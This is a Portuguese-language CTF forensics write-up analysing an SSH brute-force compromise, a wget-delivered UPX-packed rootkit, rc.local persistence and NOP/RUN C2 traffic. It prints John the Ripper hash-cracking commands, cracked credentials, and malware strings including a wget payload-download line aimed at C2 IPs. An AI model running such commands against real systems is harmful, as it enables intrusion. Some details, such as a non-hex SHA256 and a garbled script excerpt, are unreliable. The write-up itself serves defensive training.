# 🚪 EscapeRoom — CTF Writeup
### CyberDefenders Blue Team Challenge | Forense de Rede & Engenharia Reversa

---

| **Analista**          | Mauricio Robert                                                                      |
|-----------------------|--------------------------------------------------------------------------------------|
| **Organização**       | Faculdade Impacta                                                                    |
| **Data do Relatório** | 10/06/2026                                                                           |
| **Data do Incidente** | 28/07/2012                                                                           |
| **Classificação**     | CONFIDENCIAL                                                                         |
| **Ferramentas**       | Wireshark · NetworkMiner · Zeek · IDA Pro · UPX · VirusTotal · John the Ripper       |
| **Arquivo**           | `hp_challenge.pcap`                                                                  |

---

## 🔍 Resumo Executivo

Um servidor Ubuntu (`10.252.174.188`) foi comprometido após o atacante (`23.20.23.147`) realizar **52 tentativas de brute force SSH** com a ferramenta **THC-Hydra**, obtendo acesso com as credenciais **`manager:forgot`**. Após o acesso inicial, o atacante usou **`wget`** para baixar **3 arquivos maliciosos** do servidor C2. O malware principal (`1.html`) é um **ELF Linux compactado com UPX** (MD5: `772b620736b760c1d736b1e6ba2f885b`) que funciona como **rootkit**: modifica `/etc/rc.local` para persistência no reboot, armazena arquivos em `/var/mail/`, oculta o processo via módulo de kernel `sysmod.ko` e contacta periodicamente servidores externos (incluindo `174.129.37.253`) solicitando **9 arquivos** com comandos **NOP** e **RUN**. Uma segunda conta com SUDO (`sean:spectre`) representa risco adicional de escalação de privilégios.

---

## 🛠 Ferramentas Utilizadas

| Ferramenta            | Finalidade                                                                              |
|-----------------------|-----------------------------------------------------------------------------------------|
| **Wireshark**         | Análise da captura `hp_challenge.pcap` — filtragem SSH/HTTP, streams TCP               |
| **NetworkMiner 3.1**  | Extração de arquivos transferidos, metadados de hosts, credenciais capturadas           |
| **Zeek (Bro)**        | Análise de logs SSH — contagem de tentativas, `auth_success`, direcionamento de ataque  |
| **IDA Pro**           | Engenharia reversa dos binários ELF (`1.html`, `3[].html`) — funções e strings         |
| **UPX 5.2.0**         | Descompressão do executável ELF empacotado (`1.html`) para análise estática            |
| **VirusTotal**        | Verificação dos hashes MD5/SHA-256 dos arquivos maliciosos                             |
| **John the Ripper**   | Cracking dos hashes SHA-512crypt do `shadow.log` com wordlist `rockyou.txt`            |

---

## 📋 Perguntas e Respostas

### Q1 — Qual serviço o atacante usou para obter acesso ao sistema?

> **Resposta: `SSH`**

**Solução:** Filtrando o tráfego com `ssh` no Wireshark, identifica-se tráfego extenso do protocolo SSH entre o IP `23.20.23.147` (atacante) e `10.252.174.188` (alvo) na porta **22**. O NetworkMiner confirma que o servidor alvo tem a porta 22 aberta. O Zeek, com filtro `_path=="ssh"`, revela **54 conexões SSH** totais. O banner do servidor revela:

```
SSH-2.0-OpenSSH_5.9p1 Debian-Ubuntu1
```
![SSH](/Forensic/EscapeTheRoom/images/Possible_Attacker_ssh(1).png)
![SSH2](/Forensic/EscapeTheRoom/images/Protocol_Explored_SSH(1).png)

---

### Q2 — Qual tipo de ataque foi usado para obter acesso ao sistema?

> **Resposta: `BruteForce`**

**Solução:** A análise do tráfego SSH no Wireshark revela múltiplos pacotes `Server: Key Exchange Init` em rápida sucessão — padrão característico de brute force automatizado. O Zeek registra 54 entradas SSH com `auth_success: null` na grande maioria, confirmando o alto volume de tentativas falhas antes do acesso bem-sucedido.

![SSH Key Exchange](/Forensic/EscapeTheRoom/images/BruteForce_Attack_KeyExchange(2).png)

---

### Q3 — Qual ferramenta o atacante possivelmente usou para realizar o ataque?

> **Resposta: `Hydra`**

**Solução:** O padrão de ataque — múltiplas tentativas SSH em paralelo com intercalação sistemática de credenciais e timing regular — é consistente com o **THC-Hydra** (The Hacker's Choice). O NetworkMiner identifica o host atacante `23.20.23.147` com **3.095 sessões SSH** de saída enviando **248.991 bytes**. O Hydra suporta SSH nativamente e é a ferramenta padrão para este tipo de ataque:

```
github.com/vanhauser-thc/thc-hydra
```

![Hydra](/Forensic/EscapeTheRoom/images/Hydra_Tool_of_Attack(3).png)

---

### Q4 — Quantas tentativas falhas houve?

> **Resposta: `52`**

**Solução:** O Zeek, consultado com o filtro `_path=="ssh"`, retornou **54 linhas totais** de conexões SSH. Das 54, apenas **2** tiveram `auth_success: true` (as conexões bem-sucedidas). Portanto:

```
54 total - 2 sucesso = 52 tentativas falhas
```

O cálculo foi confirmado com a Calculadora durante a análise.

![Tentativas Falhas](/Forensic/EscapeTheRoom/images/Attemps_Fail_SSH(4).png)

---

### Q5 — Quais credenciais foram usadas para obter acesso? (shadow.log e sudoers.log)

> **Resposta: `manager:forgot`**

**Solução:** O arquivo `shadow.log` extraído da captura contém o hash SHA-512crypt do usuário `manager`. O cracking foi realizado com John the Ripper:

```bash
john --format=sha512crypt ~/Downloads/hash.txt \
  --wordlist=/usr/share/wordlists/seclists/Passwords/Leaked-Databases/rockyou-50.txt
```

Resultado:

```
manager:forgot   (manager)
1g DONE — 1 password hash cracked, 0 left
```

Confirmado com `john --show hash.txt`: `manager:forgot`.

![Credenciais Abusadas](/Forensic/EscapeTheRoom/images/Credentials_to_Gain_Access(5).png)

---

### Q6 — Outras credenciais com privilégios SUDO? (shadow.log e sudoers.log)

> **Resposta: `sean:spectre`**

**Solução:** Executando John the Ripper com o hash do usuário `sean` do `shadow.log` usando a wordlist completa `rockyou.txt`:

```bash
john --format=sha512crypt ~/Downloads/hash.txt \
  --wordlist=~/Downloads/rockyou.txt
```

Resultado:

```
spectre   (sean)
1g DONE — 1 password hash cracked, 0 left
```

`john --show hash.txt` confirma: `sean:spectre:15549:0:99999:7:::`. O arquivo `sudoers.log` revela que o usuário `sean` possui **privilégios SUDO**, tornando esta conta de **alto risco** para escalação de privilégios.

![Credenciais Nivel Root Abusadas](/Forensic/EscapeTheRoom/images/Credentials_root_access(6).png)

---

### Q7 — Qual ferramenta foi usada para baixar arquivos maliciosos no sistema?

> **Resposta: `wget`**

**Solução:** O pacote HTTP 2020 no Wireshark exibe o header na requisição `GET /d/3 HTTP/1.1`:

```
User-Agent: Wget/1.13.4 (linux-gnu)
```

Este User-Agent confirma inequivocamente que o comando **`wget`** foi executado no sistema comprometido para baixar os arquivos maliciosos do servidor C2 `23.20.23.147`.

![Ferramenta Usada para Instalar o Malware](/Forensic/EscapeTheRoom/images/Tool_Used_for_Install_Malware(7).png)

---

### Q8 — Quantos arquivos o atacante baixou para instalar o malware?

> **Resposta: `3`**

**Solução:** O NetworkMiner identifica **3 arquivos** baixados via HTTP do servidor atacante `23.20.23.147`:

| Arquivo | Tipo | Tamanho | Função |
|---------|------|---------|--------|
| `1[2].html` | ELF | 11.164 bytes | Malware principal (rootkit) |
| `2[2].html` | ELF | 305.702 bytes | Componente adicional |
| `3[].html`  | HTML/Shell | 315 bytes | Script de instalação |

O Zeek (filtro `_path=="http"`) confirma as 3 requisições `GET /d/1`, `GET /d/2` e `GET /d/3`, todas com resposta `HTTP 200 OK`.

![Quantidade de Arquivos](/Forensic/EscapeTheRoom/images/Number_of_Files_Installed(8).png)

---

### Q9 — Qual é o hash MD5 do malware principal?

> **Resposta: `772b620736b760c1d736b1e6ba2f885b`**

**Solução:** O NetworkMiner exibe o arquivo `1[2].html` extraído da captura com o hash:

```
MD5:    772b620736b760c1d736b1e6ba2f885b
SHA1:   7280d5e94284ab1f4a15bce1428b04145777792
SHA256: b43a77f6e8e9b2769bc2c32edab4bce02ed8e6b25l8bcf41c785d1c...
```

O arquivo é um **ELF Linux compactado com UPX** (27.482 bytes descompactado → 11.164 bytes). Verificado no VirusTotal com detecção como rootkit/trojan.

![MD5](/Forensic/EscapeTheRoom/images/MD5_Malware_Hash(9).png)

---

### Q10 — Qual arquivo o script modificou para o malware iniciar no reboot?

> **Resposta: `/etc/rc.local`**

**Solução:** A análise do arquivo `3[].html` (script shell) no IDA Pro revela comandos que sobrescrevem o arquivo `/etc/rc.local` para execução automática no reboot. O VirusTotal Code Insights confirma:

```
The script begins by moving a file named '1' to /var/mail/mail and making
it executable. It then creates or overwrites the /etc/rc.local file to
execute /var/mail/mail in the background.
```

O VirusTotal classifica o arquivo como `trojan.rootkit/shell` com **25/60 detecções**.

![Arquivo](/Forensic/EscapeTheRoom/images/Archive_of_Malware_is_Modified_After_Reboot(10).png)

---

### Q11 — Onde o malware armazena arquivos locais?

> **Resposta: `/var/mail/`**

**Solução:** A análise das strings do binário ELF descompactado (`1.html`) no IDA Pro revela a string `/var/mail/` nas seções `.rodata`. O script `3[].html` contém comandos que movem o executável para `/var/mail/mail` e o executam a partir deste diretório. O VirusTotal Code Insights confirma:

```
moving a file named '1' to /var/mail/mail
```

![Local onde o Malware Guarda os Arquivos](/Forensic/EscapeTheRoom/images/Local_Keeps_Archives(11).png)

---

### Q12 — O que está faltando no ps.log?

> **Resposta: `/var/mail/mail`**

**Solução:** O arquivo `ps.log` (cabeçalho: `Extracted via 'ps aux > ps.log' immediately after reboot`) foi extraído via NetworkMiner. Ao analisar a listagem de processos, o processo `/var/mail/mail` (o malware) está **ausente** — embora `/etc/rc.local` o inicie automaticamente no boot. Esta ausência deliberada é causada pelo módulo de kernel `sysmod.ko`, que intercepta chamadas de sistema e oculta o PID do processo `mail`.

```
## Extracted via 'ps aux > ps.log' immediately after reboot ##
[... /var/mail/mail está ausente desta listagem ...]
```

![Perca do user ps.log](/Forensic/EscapeTheRoom/images/Local_of_Missing_ps.log_stay(12).png)

---

### Q13 — Qual é o arquivo principal usado para remover informações do ps.log?

> **Resposta: `sysmod.ko`**

**Solução:** A análise do script `3[].html` no IDA Pro revela os seguintes comandos:

```bash
r'/sysmod.ko.dep modules/ uname --
  /sysmod.ko.dep modules.modprobe sysmod.sleep-1.pid
  of-mail->>/proc/...
```

O script usa `modprobe` para carregar o módulo de kernel **`sysmod.ko`** — um **LKM (Loadable Kernel Module) rootkit** responsável por ocultar o processo `/var/mail/mail` da listagem do `ps` e do `/proc`. O arquivo `.ko` é a extensão padrão para Kernel Objects (módulos carregáveis do kernel Linux).

![.ko que Exclui](/Forensic/EscapeTheRoom/images/sysmod.ko_Used_for_Delete_ps.log(13).png)

---

### Q14 — Dentro da função Main, qual função causa requisições aos servidores?

> **Resposta: `requestFile`**

**Solução:** A análise do binário ELF principal (`1.html` descompactado) no IDA Pro revela a função `main` com **90 linhas de código assembly**. Na estrutura `loc_403AE9`, a função **`requestFile`** é chamada repetidamente para cada servidor C2. A lista completa de funções identificadas pelo IDA Pro inclui funções criptográficas (`makeKeys`, `calcHash`, `decode`, `encode`, `genPriv`, `encryptMessage`, `decryptMessage`) e de rede (`requestFile`).

```asm
call    makeKeys
call    requestFile    ← função de contato com C2
call    _sprintf
call    _fopen
...
```

O UPX 5.2.0 foi utilizado para descompactar o ELF antes da análise:

```
UPX 5.2.0  27482 ← 11164  40.62%  linux/amd64  1.html
Unpacked 1 file.
```
![Descompactando o Malware](/Forensic/EscapeTheRoom/images/Unpacking_1.html(elf)_for_Reverse(14).png)
![Funcition requestfile](/Forensic/EscapeTheRoom/images/Function_Main_of_Request_Servers(14).png)

---

### Q15 — Um dos IPs contatados pelo malware começa com 17. Qual é o IP completo?

> **Resposta: `174.129.37.253`**

**Solução:** A análise das strings do binário ELF no IDA Pro (seção `.rodata`) revela os IPs dos servidores C2 **hardcoded** no malware:

```
23.20.23.147
23.21.35.128
23.22.228.174
174.129.37.253    ← IP que começa com 17
%016x
/var/mail/
sysutil
./sysutil
wget -O %s http://%s/n/%s
```

O filtro HTTP no Wireshark confirma requisições do sistema comprometido para `174.129.37.253` com respostas `HTTP/1.1 200 OK (image/bmp)`.

![IP](/Forensic/EscapeTheRoom/images/IP_of_Malware_Contact(15).png)

---

### Q16 — Quantos arquivos o malware requisitou de servidores externos?

> **Resposta: `9`**

**Solução:** O filtro `http` no Wireshark exibe as requisições GET realizadas pelo malware para os servidores C2. Contando as requisições com resposta `200 OK (image/bmp)`, identifica-se um total de **9 arquivos** requisitados. O Zeek (filtro `_path=="http"`) confirma 12 linhas HTTP totais, das quais **9** são respostas bem-sucedidas de arquivos dos servidores C2.

![Arquivos roubados](/Forensic/EscapeTheRoom/images/9_Arquives_of_Malware_Solicited_of_External_Server(16).png)

---

### Q17 — Quais comandos o malware recebia dos servidores? (ordem alfabética, separados por vírgula)

> **Resposta: `NOP,RUN`**

**Solução:** A análise do binário ELF no IDA Pro revela que a função `main` compara os dados recebidos dos servidores C2 com dois valores hexadecimais:

```
0xE4F5000  →  NOP  (no operation — aguarda)
0x5254E3A  →  RUN  (executa payload)
```

O Gemini AI auxiliou na interpretação: o compilador substituiu a comparação de string clássica (`strcmp`) por uma comparação direta de inteiros de 32 bits. Aplicando `cmp eax, 0xE4F5000` e `cmp eax, 0x5254E3A`, os bytes ASCII revelam os comandos do protocolo C2. Em ordem alfabética: **NOP, RUN**.

![NOP,RUN](/Forensic/EscapeTheRoom/images/Decrypte_HEX_fo_Functions_NOP,RUN(17).png)

---

## ⛓ Cadeia de Ataque (Kill Chain)

```
[1] RECONHECIMENTO
    Atacante identifica 10.252.174.188 com SSH (porta 22) aberto
    SSH-2.0-OpenSSH_5.9p1 Debian-Ubuntu1
    ↓
[2] BRUTE FORCE SSH — THC-Hydra
    52 tentativas falhas → 2 bem-sucedidas
    23.20.23.147 → 10.252.174.188:22 — 54 conexões SSH totais
    ↓
[3] ACESSO INICIAL
    Login SSH com manager:forgot (auth_success: true — Zeek)
    ↓
[4] DOWNLOAD DO MALWARE
    wget baixa 3 arquivos: GET /d/1, /d/2, /d/3
    User-Agent: Wget/1.13.4 (linux-gnu) — servidor 23.20.23.147
    ↓
[5] INSTALAÇÃO DO ROOTKIT
    Script 3[].html: chmod +x /var/mail/mail → modprobe sysmod.ko
    ↓
[6] PERSISTÊNCIA
    Modifica /etc/rc.local → /var/mail/mail executa no reboot
    ↓
[7] OCULTAÇÃO (LKM ROOTKIT)
    sysmod.ko intercepta chamadas de sistema
    /var/mail/mail oculto do ps e do /proc
    ↓
[8] COMANDO & CONTROLE (C2)
    Malware contacta 4+ IPs (174.129.37.253, etc.)
    9 arquivos image/bmp com comandos NOP / RUN via HTTP
```

---

## 🗺 Mapeamento MITRE ATT&CK

| ID | Técnica | Tática |
|----|---------|--------|
| T1110.001 | Brute Force: Password Guessing via SSH (Hydra) — 52 tentativas | Credential Access |
| T1078 | Valid Accounts — `manager:forgot` após brute force bem-sucedido | Defense Evasion |
| T1105 | Ingress Tool Transfer — `wget` baixando 3 arquivos ELF do servidor C2 | Command & Control |
| T1059.004 | Unix Shell — script bash `3[].html` para instalação e configuração do rootkit | Execution |
| T1037.004 | Boot/Logon Initialization Scripts: RC Scripts — `/etc/rc.local` modificado | Persistence |
| T1014 | Rootkit — `sysmod.ko` (LKM) oculta `/var/mail/mail` do `ps` e `/proc` | Defense Evasion |
| T1543.002 | Create or Modify System Process — persistência via `rc.local` | Persistence |
| T1071.001 | Application Layer Protocol: Web Protocols — C2 via HTTP com comandos NOP/RUN | Command & Control |

---

## 🚨 Indicadores de Comprometimento (IOCs)

| Tipo | Indicador | Contexto |
|------|-----------|----------|
| IP Atacante | `23.20.23.147` | Origem do brute force SSH e servidor de download do malware |
| IP Alvo | `10.252.174.188` | Servidor Ubuntu comprometido (SSH-2.0-OpenSSH_5.9p1) |
| Credencial SSH 1 | `manager:forgot` | Usada para acesso inicial via brute force |
| Credencial SSH 2 | `sean:spectre` | Conta com privilégios SUDO — alto risco de escalação |
| Ferramenta Ataque | THC-Hydra | Brute force SSH — 3.095 sessões / 248.991 bytes |
| Ferramenta Download | `wget` (Wget/1.13.4 linux-gnu) | Downloader no sistema comprometido |
| MD5 Malware | `772b620736b760c1d736b1e6ba2f885b` | Hash MD5 do malware principal (`1.html` — ELF/UPX) |
| Malware | `/var/mail/mail` | Executável do rootkit no sistema comprometido |
| Persistência | `/etc/rc.local` | Arquivo modificado para execução automática no reboot |
| LKM Rootkit | `sysmod.ko` | Módulo de kernel que oculta o processo do `ps`/`/proc` |
| IP C2 | `174.129.37.253` | Servidor C2 contactado pelo malware (começa com 17) |
| Protocolo C2 | HTTP (comandos `NOP` e `RUN`) | 9 arquivos `image/bmp` com comandos de controle |
| Tentativas SSH | `52 falhas + 2 sucesso = 54 total` | Registrado pelo Zeek SSH log |

---

## ✅ Resumo das Flags

| # | Pergunta | Flag / Resposta |
|---|----------|-----------------|
| Q1 | Serviço usado para acesso | `SSH` |
| Q2 | Tipo de ataque | `BruteForce` |
| Q3 | Ferramenta de ataque | `Hydra` |
| Q4 | Tentativas falhas | `52` |
| Q5 | Credenciais de acesso inicial | `manager:forgot` |
| Q6 | Credenciais com SUDO | `sean:spectre` |
| Q7 | Ferramenta de download | `wget` |
| Q8 | Arquivos baixados para instalação | `3` |
| Q9 | MD5 do malware principal | `772b620736b760c1d736b1e6ba2f885b` |
| Q10 | Arquivo modificado para persistência | `/etc/rc.local` |
| Q11 | Diretório de armazenamento local | `/var/mail/` |
| Q12 | O que falta no ps.log | `/var/mail/mail` |
| Q13 | Arquivo que remove informações do ps.log | `sysmod.ko` |
| Q14 | Função que faz requisições ao C2 | `requestFile` |
| Q15 | IP C2 que começa com 17 | `174.129.37.253` |
| Q16 | Arquivos requisitados de servidores externos | `9` |
| Q17 | Comandos recebidos do C2 (ordem alfabética) | `NOP,RUN` |

---

## 📚 Referências

- [MITRE ATT&CK — T1110.001 Brute Force: Password Guessing](https://attack.mitre.org/techniques/T1110/001/)
- [MITRE ATT&CK — T1014 Rootkit](https://attack.mitre.org/techniques/T1014/)
- [THC-Hydra GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [UPX Ultimate Packer for eXecutables](https://upx.github.io/)
- [VirusTotal](https://www.virustotal.com/)
- [CyberDefenders — EscapeRoom CTF](https://cyberdefenders.org/blueteam-ctf-challenges/escaperoom/)

---